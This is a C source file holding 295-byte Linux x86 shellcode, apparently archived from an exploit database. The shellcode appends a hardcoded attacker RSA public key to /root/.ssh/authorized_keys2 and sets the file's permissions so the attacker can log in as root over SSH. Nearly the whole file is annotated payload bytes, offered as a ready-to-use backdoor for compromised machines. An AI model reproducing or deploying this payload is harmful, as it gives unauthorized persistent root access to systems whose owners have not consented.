/*
 linux/x86 shellcode to append rsa key to /root/.ssh/authorized_keys2
 keys found at http://xenomuta.tuxfamily.org/exploits/authkey/
 ssh -i id_rsa_pwn root@pwned-host

 295 bytes
 by XenoMuta
     _  __                 __  ___      __
    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /
  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/

   xenomuta [ arroba ] phreaker [ punto ] net

  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 - God bless you all -

*/
unsigned char sc[] =
//<_start>:
"\x31\xd2"	 // xor    %edx,%edx
"\x52"		 // push   %edx
"\x68\x65\x79\x73\x32"	 // push   $0x32737965 ; /root/.ssh/authorized_keys2
"\x68\x65\x64\x5f\x6b"	 // push   $0x6b5f6465
"\x68\x6f\x72\x69\x7a"	 // push   $0x7a69726f
"\x68\x61\x75\x74\x68"	 // push   $0x68747561
"\x68\x73\x73\x68\x2f"	 // push   $0x2f687373
"\x68\x74\x2f\x2f\x2e"	 // push   $0x2e2f2f74
"\x68\x2f\x72\x6f\x6f"	 // push   $0x6f6f722f
"\x89\xe3"	 // mov    %esp,%ebx
"\x66\xb9\x41\x04"	 // mov    $0x441,%cx ; O_CREAT | O_APPEND | O_WRONLY
//<_open>:
"\x6a\x05"	 // push   $0x5 ; sys_open()
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
//<_write>:
"\x93"		 // xchg   %eax,%ebx
"\x89\xe6"	 // mov    %esp,%esi
"\x31\xd2"	 // xor    %edx,%edx
"\x52"		 // push   %edx
"\x6a\x0a"	 // push   $0xa
"\x68\x20\x78\x78\x78"	 // push   $0x78787820 ; contenido de id_rsa_pwn.pub
"\x68\x31\x35\x54\x4a"	 // push   $0x4a543531
"\x68\x56\x39\x48\x57"	 // push   $0x57483956
"\x68\x6d\x75\x2b\x38"	 // push   $0x382b756d
"\x68\x31\x35\x64\x31"	 // push   $0x31643531
"\x68\x64\x2f\x71\x69"	 // push   $0x69712f64
"\x68\x52\x4b\x61\x79"	 // push   $0x79614b52
"\x68\x70\x70\x79\x6e"	 // push   $0x6e797070
"\x68\x35\x46\x31\x6d"	 // push   $0x6d314635
"\x68\x55\x64\x5a\x35"	 // push   $0x355a6455
"\x68\x4d\x2b\x4c\x63"	 // push   $0x634c2b4d
"\x68\x38\x59\x41\x6d"	 // push   $0x6d415938
"\x68\x4d\x42\x50\x79"	 // push   $0x7950424d
"\x68\x4c\x44\x4d\x58"	 // push   $0x584d444c
"\x68\x41\x34\x31\x38"	 // push   $0x38313441
"\x68\x65\x33\x76\x4d"	 // push   $0x4d763365
"\x68\x48\x6f\x78\x77"	 // push   $0x77786f48
"\x68\x34\x6d\x46\x36"	 // push   $0x36466d34
"\x68\x48\x39\x6f\x39"	 // push   $0x396f3948
"\x68\x56\x59\x48\x6a"	 // push   $0x6a485956
"\x68\x4b\x41\x74\x6d"	 // push   $0x6d74414b
"\x68\x70\x7a\x64\x71"	 // push   $0x71647a70
"\x68\x50\x2b\x76\x4d"	 // push   $0x4d762b50
"\x68\x6c\x47\x51\x43"	 // push   $0x4351476c
"\x68\x50\x68\x4f\x32"	 // push   $0x324f6850
"\x68\x4d\x37\x48\x35"	 // push   $0x3548374d
"\x68\x76\x6b\x6c\x47"	 // push   $0x476c6b76
"\x68\x37\x74\x4f\x35"	 // push   $0x354f7437
"\x68\x54\x63\x6e\x77"	 // push   $0x776e6354
"\x68\x36\x63\x77\x65"	 // push   $0x65776336
"\x68\x6d\x62\x64\x71"	 // push   $0x7164626d
"\x68\x4e\x32\x75\x70"	 // push   $0x7075324e
"\x68\x74\x73\x6a\x58"	 // push   $0x586a7374
"\x68\x41\x47\x45\x41"	 // push   $0x41454741
"\x68\x49\x77\x41\x41"	 // push   $0x41417749
"\x68\x41\x41\x41\x42"	 // push   $0x42414141
"\x68\x63\x32\x45\x41"	 // push   $0x41453263
"\x68\x61\x43\x31\x79"	 // push   $0x79314361
"\x68\x42\x33\x4e\x7a"	 // push   $0x7a4e3342
"\x68\x41\x41\x41\x41"	 // push   $0x41414141
"\x68\x72\x73\x61\x20"	 // push   $0x20617372
"\x68\x73\x73\x68\x2d"	 // push   $0x2d687373
"\x89\xe1"	 // mov    %esp,%ecx
"\xb2\xa9"	 // mov    $0xa9,%dl
"\x6a\x04"	 // push   $0x4   ; sys_write()
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
"\x34\xaf"	 // xor    $0xaf,%al ; 0xa9 xor 0xaf = 0x6 ( sys_close() )
"\xcd\x80"	 // int    $0x80
"\x04\x0f"	 // add    $0xf,%al  ; sys_chmod()
"\x89\xf3"	 // mov    %esi,%ebx
"\x66\xb9\x80\x01"	 // mov    $0x180,%cx ; 0600  para que ssh no se queje
"\xcd\x80"	 // int    $0x80
"\x6a\x01"	 // push   $0x1      ; adios exit
"\x58"		 // pop    %eax
"\xcd\x80";	 // int    $0x80

main(){printf("%d bytes\n", strlen(sc));}
//main(){(*(void (*)()) sc)();}

// milw0rm.com [2008-11-23]